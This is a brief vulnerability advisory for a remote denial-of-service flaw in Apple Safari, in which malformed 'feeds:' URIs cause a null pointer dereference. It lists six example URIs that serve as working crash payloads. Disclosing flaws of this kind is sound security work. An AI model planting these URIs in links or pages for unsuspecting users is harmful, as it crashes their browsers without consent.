Apple Safari Malformed 'feeds:' URI Null Pointer Dereference Remote Denial Of Service Vulnerability

To exploit this issue, an attacker must entice an unsuspecting user to follow a malicious URI.

The following example URIs are available:

feeds:%&amp;www.example.com/feed/
feeds:{&amp;www.example.com/feed/
feeds:}&amp;www.example.com/feed/
feeds:^&amp;www.example.com/feed/
feeds:`&amp;www.example.com/feed/
feeds:|&amp;www.example.com/feed/
